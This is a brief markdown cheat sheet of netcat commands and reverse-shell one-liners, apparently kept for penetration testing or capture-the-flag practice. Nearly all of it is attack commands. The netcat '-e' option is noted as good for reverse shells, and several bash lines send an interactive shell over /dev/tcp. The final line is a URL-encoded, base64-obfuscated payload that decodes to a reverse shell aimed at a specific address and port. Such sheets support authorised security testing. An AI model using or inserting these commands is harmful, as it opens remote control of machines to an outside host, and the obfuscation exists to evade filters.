# Netcat
Comm | Desc
--- | ---
`nc -l -p <port>` | listen on port
`nc <dest_ip> <port>` | Connect to dest_ip on port
`nc <dest_ip> <port> -e <binary>` | Connect to dest_ip on port executing binary (great for rev shell)


#netcatalternative
`setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &`
`bash -i &>/dev/tcp/IP/PORT 0>&1' #`
`echo $(echo 'bash -i &> /dev/tcp/IP/PORT  <&1' | base64) | base64 -d | bash`


`echo%20"YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xMjEvNjY2NiA8JjE="%20|%20base64%20-d%20|%20bash`